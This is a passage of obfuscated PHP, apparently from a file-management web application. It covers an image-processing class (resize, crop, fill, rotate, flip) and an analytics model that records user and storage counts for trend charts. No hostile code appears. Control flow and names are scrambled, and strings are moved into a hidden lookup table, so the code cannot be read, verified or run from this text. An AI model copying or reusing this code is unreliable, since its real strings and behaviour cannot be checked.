BßÌ¥Í¬ù; EÖ×ò¸™¥‚: $this->srcFile = $cÌ‘½§ëÙÕ; $this->echoType = $e’ÛÉ±Á; $this->im = self::image($cÌ‘½§ëÙÕ); goto AµŠîî’³Á; BßÌ¥Í¬ù: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto dİ«íÆ…ó; dİ«íÆ…ó: } public static function image($d¿«©¹éË®) { $E•—…—¹ê =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A“¢Ïìİ = $E•—…—¹ê[33]; $FÍ›Ğ¿† = GetImageSize($d¿«©¹éË®, $A“¢Ïìİ); $aä£—§‚Ô± = !1; switch ($FÍ›Ğ¿†[2]) { case IMAGETYPE_GIF: if (!function_exists($E•—…—¹ê[1832])) { break; } $aä£—§‚Ô± = imagecreatefromgif($d¿«©¹éË®); break; case IMAGETYPE_JPEG: if (!function_exists($E•—…—¹ê[1833])) { break; } $aä£—§‚Ô± = imagecreatefromjpeg($d¿«©¹éË®); break; case IMAGETYPE_PNG: if (!function_exists($E•—…—¹ê[1834])) { break; } $aä£—§‚Ô± = @imagecreatefrompng($d¿«©¹éË®); imagesavealpha($aä£—§‚Ô±, !0); break; case IMAGETYPE_XBM: $aä£—§‚Ô± = imagecreatefromxbm($d¿«©¹éË®); break; case IMAGETYPE_WBMP: $aä£—§‚Ô± = imagecreatefromwbmp($d¿«©¹éË®); break; case IMAGETYPE_BMP: $aä£—§‚Ô± = imagecreatefrombmp($d¿«©¹éË®); break; default: break; } return $aä£—§‚Ô±; } public static function imageSize($aùÄèİÓæß) { $E‹Ñİ½—Ÿ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a‹˜Î©ÏÊÂ = GetImageSize($aùÄèİÓæß); if (!$a‹˜Î©ÏÊÂ) { return !1; } return array($E‹Ñİ½—Ÿ[1835] => $a‹˜Î©ÏÊÂ[0], $E‹Ñİ½—Ÿ[1836] => $a‹˜Î©ÏÊÂ[1]); } function distortion($B˜Ù ‹¶Å, $Dä®ÉˆÅÙÓ, $fŠ÷©¯òõ®) { $d¢©—ñ ‘´ = $this->creatImage($this->im, $Dä®ÉˆÅÙÓ, $fŠ÷©¯òõ®, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($d¢©—ñ ‘´, $B˜Ù ‹¶Å); } function prorate($DŞù›‘•ˆ, $aÛ¦­¹‚ø, $fÇáŠˆˆ) { $Dç´ ƒ‘¯ = $aÛ¦­¹‚ø / $fÇáŠˆˆ; $cøØ–öƒ¢İ = $this->srcW / $this->srcH; if ($Dç´ ƒ‘¯ <= $cøØ–öƒ¢İ) { $cÈô¸ÊÎ½– = $aÛ¦­¹‚ø; $e„Òô¦Ñ’» = $cÈô¸ÊÎ½– * ($this->srcH / $this->srcW); } else { $e„Òô¦Ñ’» = $fÇáŠˆˆ; $cÈô¸ÊÎ½– = $e„Òô¦Ñ’» * ($this->srcW / $this->srcH); } if ($this->srcW > $aÛ¦­¹‚ø || $this->srcH > $fÇáŠˆˆ) { $eƒ‹æÔ‰Ã = $this->creatImage($this->im, $cÈô¸ÊÎ½–, $e„Òô¦Ñ’», 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($eƒ‹æÔ‰Ã, $DŞù›‘•ˆ); } else { $eƒ‹æÔ‰Ã = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($eƒ‹æÔ‰Ã, $DŞù›‘•ˆ); } } function cut($c„Ğ…Ã´ÓÈ, $Fô‹¶Ç‹¯Ş, $CËø«ÌÓÎò) { goto Eà×Ê‹ñÎ; c‡àê÷Š…Ó: return $this->echoImage($DßôËÓ‰Ç, $c„Ğ…Ã´ÓÈ); goto FÊ¬Ÿë˜ñ†; EğÑÀ£¹ñ†: $AÏÙ÷Îª¶Ñ = $this->creatImage($this->im, $eïŒ†ìâİ, $E Ëî†ß–, 0, 0, 0, 0, $this->srcW, $this->srcH); $DßôËÓ‰Ç = $this->creatImage($AÏÙ÷Îª¶Ñ, $Fô‹¶Ç‹¯Ş, $CËø«ÌÓÎò, 0, 0, ($eïŒ†ìâİ - $Fô‹¶Ç‹¯Ş) / 2, ($E Ëî†ß– - $CËø«ÌÓÎò) / 2, $Fô‹¶Ç‹¯Ş, $CËø«ÌÓÎò); imageDestroy($AÏÙ÷Îª¶Ñ); goto c‡àê÷Š…Ó; Eà×Ê‹ñÎ: $A†±ØÏ­ŠÀ = $Fô‹¶Ç‹¯Ş / $CËø«ÌÓÎò; $fƒ·™ïÅæ = $this->srcW / $this->srcH; if ($A†±ØÏ­ŠÀ <= $fƒ·™ïÅæ) { $E Ëî†ß– = $CËø«ÌÓÎò; $eïŒ†ìâİ = $E Ëî†ß– * ($this->srcW / $this->srcH); } else { $eïŒ†ìâİ = $Fô‹¶Ç‹¯Ş; $E Ëî†ß– = $eïŒ†ìâİ * ($this->srcH / $this->srcW); } goto EğÑÀ£¹ñ†; FÊ¬Ÿë˜ñ†: } function backFill($bœ²Â°ĞâŸ, $DÌÀÕª£Ó, $b¥Û»¼×¬ê, $f¿Úõ·‘ = false, $CíçÎ™Äºƒ = 255, $b£øŒ ‰—ã = 255, $f³ÊâÃÓŞÃ = 255) { goto B®Ï¦ñ™±; B®Ï¦ñ™±: $bÆßá¥ƒ¬Ò = $DÌÀÕª£Ó / $b¥Û»¼×¬ê; $BÂ¶ÇçÒº = $this->srcW / $this->srcH; if ($bÆßá¥ƒ¬Ò <= $BÂ¶ÇçÒº) { $B”¯†¸ = $DÌÀÕª£Ó; $dğ†ÀµºÈù = $B”¯†¸ * ($this->srcH / $this->srcW); } else { $dğ†ÀµºÈù = $b¥Û»¼×¬ê; $B”¯†¸ = $dğ†ÀµºÈù * ($this->srcW / $this->srcH); } goto bÙ÷™¯Ô“®; bÙ÷™¯Ô“®: if (function_exists($_SERVER[ÚŠ•´ÍéÒÑÔ][1837])) { @($bÃ½ù™çĞ¢ = imageCreateTrueColor($DÌÀÕª£Ó, $b¥Û»¼×¬ê)); if (!$bÃ½ù™çĞ¢) { $bÃ½ù™çĞ¢ = imageCreate($DÌÀÕª£Ó, $b¥Û»¼×¬ê); } } else { $bÃ½ù™çĞ¢ = imageCreate($DÌÀÕª£Ó, $b¥Û»¼×¬ê); } $Fº½å½ê…è = ($b¥Û»¼×¬ê - $dğ†ÀµºÈù) / 2; $DëÄ’ñÜ = imagecolorallocate($bÃ½ù™çĞ¢, $CíçÎ™Äºƒ, $b£øŒ ‰—ã, $f³ÊâÃÓŞÃ); goto fâ¥’šÑ›Ì; eøóŞ•ƒêà: return $this->echoImage($bÃ½ù™çĞ¢, $bœ²Â°ĞâŸ); goto C»àÜ¡è­à; fâ¥’šÑ›Ì: if ($f¿Úõ·‘) { $DëÄ’ñÜ = imageColorTransparent($bÃ½ù™çĞ¢, $DëÄ’ñÜ); $Fº½å½ê…è = $b¥Û»¼×¬ê - $dğ†ÀµºÈù; } imageFilledRectangle($bÃ½ù™çĞ¢, 0, 0, $DÌÀÕª£Ó, $b¥Û»¼×¬ê, $DëÄ’ñÜ); if ($this->srcW > $DÌÀÕª£Ó || $this->srcH > $b¥Û»¼×¬ê) { $AÆõ†ĞÌ„¢ = $this->creatImage($this->im, $B”¯†¸, $dğ†ÀµºÈù, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($B”¯†¸ < $DÌÀÕª£Ó) { imageCopy($bÃ½ù™çĞ¢, $AÆõ†ĞÌ„¢, ($DÌÀÕª£Ó - $B”¯†¸) / 2, 0, 0, 0, $B”¯†¸, $dğ†ÀµºÈù); } else { if ($dğ†ÀµºÈù < $b¥Û»¼×¬ê) { imageCopy($bÃ½ù™çĞ¢, $AÆõ†ĞÌ„¢, 0, $Fº½å½ê…è, 0, 0, $B”¯†¸, $dğ†ÀµºÈù); } else { imageCopy($bÃ½ù™çĞ¢, $AÆõ†ĞÌ„¢, 0, 0, 0, 0, $B”¯†¸, $dğ†ÀµºÈù); } } } else { imageCopyMerge($bÃ½ù™çĞ¢, $this->im, ($DÌÀÕª£Ó - $B”¯†¸) / 2, $Fº½å½ê…è, 0, 0, $B”¯†¸, $dğ†ÀµºÈù, 100); } goto eøóŞ•ƒêà; C»àÜ¡è­à: } function creatImage($eÕÎ¹ö¢íë, $bùÜ¾ÙËˆ˜, $c¨ŠËÄó—, $D¥˜¡ÆÌ†, $F„‹•ÎÕ¨, $cÈƒ³ø‘ , $b‡—ŸŞÀğ, $BÖëñƒÑÎ, $B¸ÎĞ´´ä…) { if (function_exists($_SERVER[ÚŠ•´ÍéÒÑÔ][1837])) { @($b½ÂÊ¥ƒ¤¨ = ImageCreateTrueColor($bùÜ¾ÙËˆ˜, $c¨ŠËÄó—)); @imagealphablending($b½ÂÊ¥ƒ¤¨, !1); @imagesavealpha($b½ÂÊ¥ƒ¤¨, !0); if ($b½ÂÊ¥ƒ¤¨) { imageCopyResampled($b½ÂÊ¥ƒ¤¨, $eÕÎ¹ö¢íë, $D¥˜¡ÆÌ†, $F„‹•ÎÕ¨, $cÈƒ³ø‘ , $b‡—ŸŞÀğ, $bùÜ¾ÙËˆ˜, $c¨ŠËÄó—, $BÖëñƒÑÎ, $B¸ÎĞ´´ä…); } else { $b½ÂÊ¥ƒ¤¨ = ImageCreate($bùÜ¾ÙËˆ˜, $c¨ŠËÄó—); imageCopyResized($b½ÂÊ¥ƒ¤¨, $eÕÎ¹ö¢íë, $D¥˜¡ÆÌ†, $F„‹•ÎÕ¨, $cÈƒ³ø‘ , $b‡—ŸŞÀğ, $bùÜ¾ÙËˆ˜, $c¨ŠËÄó—, $BÖëñƒÑÎ, $B¸ÎĞ´´ä…); } } else { $b½ÂÊ¥ƒ¤¨ = ImageCreate($bùÜ¾ÙËˆ˜, $c¨ŠËÄó—); imageCopyResized($b½ÂÊ¥ƒ¤¨, $eÕÎ¹ö¢íë, $D¥˜¡ÆÌ†, $F„‹•ÎÕ¨, $cÈƒ³ø‘ , $b‡—ŸŞÀğ, $bùÜ¾ÙËˆ˜, $c¨ŠËÄó—, $BÖëñƒÑÎ, $B¸ÎĞ´´ä…); } return $b½ÂÊ¥ƒ¤¨; } public function imgRotate($eëÉ¦ÅÎ–, $A¬ùÖ£Í) { goto CÒä‘º–åÆ; CÒä‘º–åÆ: if (!$this->im || $A¬ùÖ£Í % 360 === 0 || !function_exists($_SERVER[ÚŠ•´ÍéÒÑÔ][1838])) { return !1; } $F¨•ƒ·—¼ = imageRotate($this->im, 360 - $A¬ùÖ£Í, 0); $A›³…é¹Äö = !1; goto f•‰ê…‡¨; A÷“Ê‰¢ğ’: return $A›³…é¹Äö; goto eÕñÖĞÄãï; f•‰ê…‡¨: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $A›³…é¹Äö = imagegif($F¨•ƒ·—¼, $eëÉ¦ÅÎ–); break; case IMAGETYPE_JPEG: $A›³…é¹Äö = imagejpeg($F¨•ƒ·—¼, $eëÉ¦ÅÎ–, 100); break; case IMAGETYPE_PNG: $A›³…é¹Äö = imagePNG($F¨•ƒ·—¼, $eëÉ¦ÅÎ–); break; default: break; } imageDestroy($F¨•ƒ·—¼); imageDestroy($this->im); goto A÷“Ê‰¢ğ’; eÕñÖĞÄãï: } function echoImage($cÅò˜®¹˜, $fŠº¤¡ÛÓƒ) { goto E¿Å¾¥æéº; eÄŠ£»«„: imageDestroy($this->im); return $b¦ê¹Úç…Œ; goto FëöŠĞÏ¦‹; d«¥ßÛŒº´: $b¦ê¹Úç…Œ = !1; switch ($this->echoType) { case $a×²¿½ø³‰[1839]: $b¦ê¹Úç…Œ = imagePNG($cÅò˜®¹˜); break; case $a×²¿½ø³‰[164]: $b¦ê¹Úç…Œ = imagePNG($cÅò˜®¹˜, $fŠº¤¡ÛÓƒ); break; } imageDestroy($cÅò˜®¹˜); goto eÄŠ£»«„; E¿Å¾¥æéº: $a×²¿½ø³‰ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$cÅò˜®¹˜) { return !1; } ob_get_clean(); goto d«¥ßÛŒº´; FëöŠĞÏ¦‹: } } if (!function_exists($_SERVER[ÚŠ•´ÍéÒÑÔ][1840])) { define($_SERVER[ÚŠ•´ÍéÒÑÔ][1841], 0); define($_SERVER[ÚŠ•´ÍéÒÑÔ][1842], 1); define($_SERVER[ÚŠ•´ÍéÒÑÔ][1843], 2); function imageflip($CŠ¿¿ª±», $Bé‚‰¼›­™) { switch ($Bé‚‰¼›­™) { case IMG_FLIP_HORIZONTAL: $b©ÒÛ¦ · = imagesx($CŠ¿¿ª±») - 1; $BÓ„©¸Í­é = $b©ÒÛ¦ · / 2; $eë—î†à¨ = imagesy($CŠ¿¿ª±»); $Aã†ãÏÁ„ = imageistruecolor($CŠ¿¿ª±») ? imagecreatetruecolor(1, $eë—î†à¨) : imagecreate(1, $eë—î†à¨); for ($Aïõª‹š = 0; $Aïõª‹š < $BÓ„©¸Í­é; ++$Aïõª‹š) { imagecopy($Aã†ãÏÁ„, $CŠ¿¿ª±», 0, 0, $Aïõª‹š, 0, 1, $eë—î†à¨); imagecopy($CŠ¿¿ª±», $CŠ¿¿ª±», $Aïõª‹š, 0, $b©ÒÛ¦ · - $Aïõª‹š, 0, 1, $eë—î†à¨); imagecopy($CŠ¿¿ª±», $Aã†ãÏÁ„, $b©ÒÛ¦ · - $Aïõª‹š, 0, 0, 0, 1, $eë—î†à¨); } break; case IMG_FLIP_VERTICAL: $c­ÎÌºÛˆ¡ = imagesx($CŠ¿¿ª±»); $dßƒğÃëÛ§ = imagesy($CŠ¿¿ª±») - 1; $b‹äãòâ³Ö = $dßƒğÃëÛ§ / 2; $Aã†ãÏÁ„ = imageistruecolor($CŠ¿¿ª±») ? imagecreatetruecolor($c­ÎÌºÛˆ¡, 1) : imagecreate($c­ÎÌºÛˆ¡, 1); for ($c¸‡ÇŸ”ˆ¿ = 0; $c¸‡ÇŸ”ˆ¿ < $b‹äãòâ³Ö; ++$c¸‡ÇŸ”ˆ¿) { imagecopy($Aã†ãÏÁ„, $CŠ¿¿ª±», 0, 0, 0, $c¸‡ÇŸ”ˆ¿, $c­ÎÌºÛˆ¡, 1); imagecopy($CŠ¿¿ª±», $CŠ¿¿ª±», 0, $c¸‡ÇŸ”ˆ¿, 0, $dßƒğÃëÛ§ - $c¸‡ÇŸ”ˆ¿, $c­ÎÌºÛˆ¡, 1); imagecopy($CŠ¿¿ª±», $Aã†ãÏÁ„, 0, $dßƒğÃëÛ§ - $c¸‡ÇŸ”ˆ¿, 0, 0, $c­ÎÌºÛˆ¡, 1); } break; case IMG_FLIP_BOTH: $c­ÎÌºÛˆ¡ = imagesx($CŠ¿¿ª±»); $eë—î†à¨ = imagesy($CŠ¿¿ª±»); $Aã†ãÏÁ„ = imagerotate($CŠ¿¿ª±», 180, 0); imagecopy($CŠ¿¿ª±», $Aã†ãÏÁ„, 0, 0, 0, 0, $c­ÎÌºÛˆ¡, $eë—î†à¨); break; default: return; } imagedestroy($Aã†ãÏÁ„); } } if (!function_exists($_SERVER[ÚŠ•´ÍéÒÑÔ][1844])) { function imagecreatefrombmp($b¢ò‚†Ö…) { return ImageGdBMP::load($b¢ò‚†Ö…); } } goto dˆİÎÀ½±¬; F¡†õ·îÇ: class AnalysisModel extends ModelBaseLight { public function init($A¯ØŠéçç) { $BÎù ´ß—ø =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D®ß¢×„î¿ = array($BÎù ´ß—ø[531] => array($BÎù ´ß—ø[29] => $BÎù ´ß—ø[1998], $BÎù ´ß—ø[258] => array($BÎù ´ß—ø[207], $BÎù ´ß—ø[695], $BÎù ´ß—ø[1999], $BÎù ´ß—ø[2000])), $BÎù ´ß—ø[2001] => array($BÎù ´ß—ø[29] => $BÎù ´ß—ø[2002], $BÎù ´ß—ø[258] => array($BÎù ´ß—ø[207], $BÎù ´ß—ø[693], $BÎù ´ß—ø[2003], $BÎù ´ß—ø[2004], $BÎù ´ß—ø[2005]))); if (!isset($D®ß¢×„î¿[$A¯ØŠéçç])) { return !1; } $this->optionType = $D®ß¢×„î¿[$A¯ØŠéçç][$BÎù ´ß—ø[29]]; $this->field = $D®ß¢×„î¿[$A¯ØŠéçç][$BÎù ´ß—ø[258]]; return !0; } public function listData($f»­•èÀÍÖ = false, $bÃĞØ¤æ¯’ = "\155\x6f\144\151\146\x79\124\151\155\x65", $AˆçÆÏÛõö = false) { return parent::listData($f»­•èÀÍÖ, $bÃĞØ¤æ¯’, $AˆçÆÏÛõö); } public function trendList($BŞøùÑ“„À) { goto DŸíÍ­è; DŸíÍ­è: $Aœ¿©£ÜØ¦ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E­êéÎ±õ… = $this->listData(); if ($E­êéÎ±õ…) { $B°­š¾ÎÄ© = end($E­êéÎ±õ…); $B˜ÁÂŸ˜¤È = date($Aœ¿©£ÜØ¦[2006], strtotime($Aœ¿©£ÜØ¦[2007])); if ($B°­š¾ÎÄ©[$Aœ¿©£ÜØ¦[207]] == $B˜ÁÂŸ˜¤È) { return $E­êéÎ±õ…; } $EÍ¦Â‰½ù = strtotime($B°­š¾ÎÄ©[$Aœ¿©£ÜØ¦[207]]); } goto AøÃâ†‘¾©; AøÃâ†‘¾©: if (!isset($EÍ¦Â‰½ù)) { $A™••Şª‡ = $BŞøùÑ“„À == $Aœ¿©£ÜØ¦[531] ? $Aœ¿©£ÜØ¦[473] : $Aœ¿©£ÜØ¦[747]; $EÍ¦Â‰½ù = Model($A™••Şª‡)->min($Aœ¿©£ÜØ¦[184]); } $bÂ¥Š´Ü”ê = $Aœ¿©£ÜØ¦[2008] . ucfirst($BŞøùÑ“„À); $CºÏÅ¦¼ïê = $this->dateList($EÍ¦Â‰½ù); goto Bˆ¤•ó«ôå; Bˆ¤•ó«ôå: foreach ($CºÏÅ¦¼ïê as $B˜ÁÂŸ˜¤È) { $this->{$bÂ¥Š´Ü”ê}($B˜ÁÂŸ˜¤È); } return $this->listData(); goto d¡“ÉÚğÃ; d¡“ÉÚğÃ: } private function dateList($f‚©ˆë—Ş) { $bĞ¨Î’Œ‚æ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b§ó¯–í¡Ù = $f‚©ˆë—Ş; $E××âÏğÊî = strtotime($bĞ¨Î’Œ‚æ[2007]); $E¦“Ë¦íÏŠ = array(); while ($b§ó¯–í¡Ù <= $E××âÏğÊî) { $E¦“Ë¦íÏŠ[] = date($bĞ¨Î’Œ‚æ[2006], $b§ó¯–í¡Ù); $b§ó¯–í¡Ù = strtotime($bĞ¨Î’Œ‚æ[2009], $b§ó¯–í¡Ù); } return $E¦“Ë¦íÏŠ; } public function _recordUser($eòÏã‘» = '') { goto dÑ‹§ˆ™öš; DĞ‚íŠî„Ñ: $b™±¼ÉçÙ‡ = array($A†¾Áœ•Ÿù[207] => $eòÏã‘», $A†¾Áœ•Ÿù[695] => (int) $EÀö£ˆäÉÄ, $A†¾Áœ•Ÿù[1999] => (int) $Cˆ£’İé™ä, $A†¾Áœ•Ÿù[2000] => (int) $c£ŞõµƒÃ); return $this->insert($b™±¼ÉçÙ‡); goto eŸ‚ºîŞ÷ˆ; dÑ‹§ˆ™öš: $A†¾Áœ•Ÿù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cÖšÑ“ôù¥ = strtotime(date($A†¾Áœ•Ÿù[2010], strtotime($eòÏã‘»))); $E‚›„š¯÷ = strtotime(date($A†¾Áœ•Ÿù[2011], strtotime($eòÏã‘»))); goto F†–’·‚Ë; F†–’·‚Ë: $bŞÃÁ‰ÒŠ« = array($A†¾Áœ•Ÿù[184] => array($A†¾Áœ•Ÿù[921], $E‚›„š¯÷)); $EÀö£ˆäÉÄ = Model($A†¾Áœ•Ÿù[473])->where($bŞÃÁ‰ÒŠ«)->count($A†¾Áœ•Ÿù[1409]); $bŞÃÁ‰ÒŠ«[$A†¾Áœ•Ÿù[184]] = array($A†¾Áœ•Ÿù[318], array($cÖšÑ“ôù¥, $E‚›„š¯÷)); goto cœ¿™ÖÂƒæ; cœ¿™ÖÂƒæ: $Cˆ£’İé™ä = Model($A†¾Áœ•Ÿù[473])->where($bŞÃÁ‰ÒŠ«)->count($A†¾Áœ•Ÿù[1409]); $bŞÃÁ‰ÒŠ«[$A†¾Áœ•Ÿù[29]] = $A†¾Áœ•Ÿù[2012]; $c£ŞõµƒÃ = Model($A†¾Áœ•Ÿù[2013])->where($bŞÃÁ‰ÒŠ«)->count($A†¾Áœ•Ÿù[2014]); goto DĞ‚íŠî„Ñ; eŸ‚ºîŞ÷ˆ: } public function _recordStore($Bóõ®ÕòŠÉ = '') { goto D¤‹ÊŒ´¤; D¤‹ÊŒ´¤: $a’§¯³­Ï» =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $f§’´¦ŸŒ³ = strtotime(date($a’§¯³­Ï»[2011], strtotime($Bóõ®ÕòŠÉ))); $A®½ï¸²Úù = array($a’§¯³­Ï»[184] => array($a’§¯³­Ï»[921], $f§’´¦ŸŒ³)); goto d½àË‹“ˆ; d½àË‹“ˆ: $C‰ËÔ°ƒ‚„ = Model($a’§¯³­Ï»[418])->where($A®½ï¸²Úù)->sum($a’§¯³­Ï»[77]); $A®½ï¸²Úù[$a’§¯³­Ï»[367]] = 0; $D”œÏĞÖ‘‘ = Model($a’§¯³­Ï»[747])->where($A®½ï¸²Úù)->sum($a’§¯³­Ï»[77]); goto DÁÇèÎÓø; Cñßø”å: $dø¯»¹ãç• = Model($a’§¯³­Ï»[747])->where($A®½ï¸²Úù)->sum($a’§¯³­Ï»[77]); $a¨‚È³¢ = array($a’§¯³­Ï»[207] => $Bóõ®ÕòŠÉ, $a’§¯³­Ï»[693] => (int) $D”œÏĞÖ‘‘, $a’§¯³­Ï»[2003] => (int) $C‰ËÔ°ƒ‚„, $a’§¯³­Ï»[2004] => (int) $cé­´œ¨–, $a’§¯³­Ï»[2005] => (int) $dø¯»¹ãç•); return $this->insert($a¨‚È³¢); goto FšÛİ›èŞÓ; DÁÇèÎÓø: $A®½ï¸²Úù[$a’§¯³­Ï»[368]] = 1; $cé­´œ¨– = Model($a’§¯³­Ï»[747])->where($A®½ï¸²Úù)->sum($a’§¯³­Ï»[77]); $A®½ï¸²Úù[$a’§¯³­Ï»[368]] = 2; goto Cñßø”å; FšÛİ›èŞÓ: } public function trend($f¥¯»‚£¾†, $AìÉİòä) { goto A¾ƒÛø‘Ç; aİŒ®õãëù: return $d¤ƒêáà Ö; goto D²´ÑñÎ‘Ú; EËìÓ‚Î‚È: if ($D‚±œ¹¿ØŠ && $AìÉİòä != $E»¸ßĞ±è[1384]) { $B‹’»×ÖÀÁ = $D‚±œ¹¿ØŠ[0][$E»¸ßĞ±è[207]]; $a»·¶·¾ßó = $this->validDate($AìÉİòä, $B‹’»×ÖÀÁ); $e‚óÕïí§ó = array(); $F¶ßê£ã» = array_to_keyvalue($D‚±œ¹¿ØŠ, $E»¸ßĞ±è[207]); foreach ($a»·¶·¾ßó as $bî£®ñËÓ) { if (isset($F¶ßê£ã»[$bî£®ñËÓ])) { $CˆíÂÓà¢ç = $F¶ßê£ã»[$bî£®ñËÓ]; } else { $CˆíÂÓà¢ç = end($D‚±œ¹¿ØŠ); $CˆíÂÓà¢ç[$E»¸ßĞ±è[207]] = $bî£®ñËÓ; if ($f¥¯»‚£¾† == $E»¸ßĞ±è[531]) { $CˆíÂÓà¢ç[$E»¸ßĞ±è[1999]] = $CˆíÂÓà¢ç[$E»¸ßĞ±è[2000]] = 0; } } $e‚óÕïí§ó[] = $CˆíÂÓà¢ç; } $D‚±œ¹¿ØŠ = $e‚óÕïí§ó; } $cŠ‘¸»§‚ = array($E»¸ßĞ±è[531] => array($E»¸ßĞ±è[695] => LNG($E»¸ßĞ±è[2015]), $E»¸ßĞ±è[1999] => LNG($E»¸ßĞ±è[2016]), $E»¸ßĞ±è[2000] => LNG($E»¸ßĞ±è[2017])), $E»¸ßĞ±è[2001] => array($E»¸ßĞ±è[693] => LNG($E»¸ßĞ±è[2018]), $E»¸ßĞ±è[2003] => LNG($E»¸ßĞ±è[2019]), $E»¸ßĞ±è[2004] => LNG($E»¸ßĞ±è[2020]), $E»¸ßĞ±è[2005] => LNG($E»¸ßĞ±è[2021]))); $AŞ¯«¤§Îí = array($E»¸ßĞ±è[531] => $E»¸ßĞ±è[2022], $E»¸ßĞ±è[2001] => $E»¸ßĞ±è[77]); goto EªäÌ†µÔ; A¾ƒÛø‘Ç: $E»¸ßĞ±è =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->init($f¥¯»‚£¾†)) { return !1; } $D‚±œ¹¿ØŠ = $this->trendList($f¥¯»‚£¾†); goto EËìÓ‚Î‚È; EªäÌ†µÔ: if (empty($D‚±œ¹¿ØŠ)) { $bî£®ñËÓ = date($E»¸ßĞ±è[2006], strtotime($E»¸ßĞ±è[2007])); $bé«±æ¸·ù = array($E»¸ßĞ±è[207] => $bî£®ñËÓ); foreach ($cŠ‘¸»§‚[$f¥¯»‚£¾†] as $BÖŠ¬Ü¨ => $F„’«£·å¦) { $bé«±æ¸·ù[$BÖŠ¬Ü¨] = 0; } $D‚±œ¹¿ØŠ[] = $bé«±æ¸·ù; } $d¤ƒêáà Ö = array(); foreach ($D‚±œ¹¿ØŠ as $F„’«£·å¦) { if ($f¥¯»‚£¾† == $E»¸ßĞ±è[2001] && $F„’«£·å¦[$E»¸ßĞ±è[2003]] > $F„’«£·å¦[$E»¸ßĞ±è[693]]) { $F„’«£·å¦[$E»¸ßĞ±è[2003]] = $F„’«£·å¦[$E»¸ßĞ±è[693]]; } foreach ($cŠ‘¸»§‚[$f¥¯»‚£¾†] as $BÖŠ¬Ü¨ => $dÇè•Ù¿¬º) { $CˆíÂÓà¢ç = array($E»¸ßĞ±è[207] => $F„’«£·å¦[$E»¸ßĞ±è[207]], $E»¸ßĞ±è[1316] => $dÇè•Ù¿¬º); $CˆíÂÓà¢ç[$AŞ¯«¤§Îí[$f¥¯»‚£¾†]] = isset($F„’«£·å¦[$BÖŠ¬Ü¨]) ? $F„’«£·å¦[$BÖŠ¬Ü¨] : 0; $d¤ƒêáà Ö[] = $CˆíÂÓà¢ç; } } goto aİŒ®õãëù; D²´ÑñÎ‘Ú: } public function validDate($dîÁâ‡½Œè, $A‘µ»ùœÌ¤) { goto e¢ùÁ–…Ó¯; e¢ùÁ–…Ó¯: $cÓäµ±ó• =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BÙª‡Ûã¹ = date($cÓäµ±ó•[2006], strtotime($cÓäµ±ó•[2007])); $FÅœ Ü•ô‹ = array($BÙª‡Ûã¹); goto E¤¨à²ĞÅ; d”Àò‡‚“ç: return $FÅœ Ü•ô‹; goto F‡»½¸ïØå; E¤¨à²ĞÅ: switch ($dîÁâ‡½Œè) { case $cÓäµ±ó•[1391]: $cˆ†Õ¯… = mktime(0, 0, 0, date($cÓäµ±ó•[2023]), date($cÓäµ±ó•[2024]) - date($cÓäµ±ó•[1213]) + 7 - 7, date($cÓäµ±ó•[2025])); $fİ¾½Ø¸¨â = 0; do { $fÓƒÅÅ·ˆì = date($cÓäµ±ó•[2006], $cˆ†Õ¯… - 3600 * 24 * 7 * $fİ¾½Ø¸¨â); $FÅœ Ü•ô‹[] = $fÓƒÅÅ·ˆì; $fİ¾½Ø¸¨â++; } while ($A‘µ»ùœÌ¤ < $fÓƒÅÅ·ˆì); break; case $cÓäµ±ó•[1389]: $fİ¾½Ø¸¨â = 1; do { $eî†Äó¥òÅ = date($cÓäµ±ó•[2026], strtotime("\55\x20{$fİ¾½Ø¸¨â}\40\x6d\157\x6e\x74\150\163")); $FÅœ Ü•ô‹[] = $eî†Äó¥òÅ; $fİ¾½Ø¸¨â++; } while ($A‘µ»ùœÌ¤ < $eî†Äó¥òÅ); break; case $cÓäµ±ó•[1694]: $B†Éí§  = (int) date($cÓäµ±ó•[2025], strtotime($A‘µ»ùœÌ¤)); $aÉ¢™œÁ£ = (int) date($cÓäµ±ó•[2025]); if ($B†Éí§  >= $aÉ¢™œÁ£) { break; } for ($B†Éí§ ; $B†Éí§  < $aÉ¢™œÁ£; $B†Éí§ ++) { $FÅœ Ü•ô‹[] = $B†Éí§  . $cÓäµ±ó•[2027]; } break; default: break; } if ($A‘µ»ùœÌ¤ > end($FÅœ Ü•ô‹)) { array_pop($FÅœ Ü•ô‹); } sort($FÅœ Ü•ô‹); goto d”Àò‡‚“ç; F‡»½¸ïØå: } public function listTable($a£‡©æ÷Î) { $B–…Ëò‹ÄØ = ucfirst($a£‡©æ÷Î); return Model($B–…Ëò‹ÄØ)->listData(); } public function option($FêÒÛ„×ƒ) { $aã—°„‚ = $_SERVER[ÚŠ•´ÍéÒÑÔ][2028] . ucfirst($FêÒÛ„×ƒ); return $this->{$aã—°„‚}(); } private function optionUser() { goto CÚöÕ×ÛÏ¥; CÚöÕ×ÛÏ¥: $E˜ë¯¶‚Ğ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B—ˆ‰ˆÊŸ› = Model($E˜ë¯¶‚Ğ[473])->count($E˜ë¯¶‚Ğ[1409]); $b»§¡Î¯©Ó = Model($E˜ë¯¶‚Ğ[473])->where($E˜ë¯¶‚Ğ[2029])->count($E˜ë¯¶‚Ğ[1409]); goto B…ïÕ¹Ê¾ˆ; aïÃŸç½³: $bã¶—ª…Ó = Model($E˜ë¯¶‚Ğ[473])->where($dÎéÃ®‰‚‘)->count($E˜ë¯¶‚Ğ[1409]); return array($E˜ë¯¶‚Ğ[690] => (int) $B—ˆ‰ˆÊŸ›, $E˜ë¯¶‚Ğ[2032] => (int) ($B—ˆ‰ˆÊŸ› - 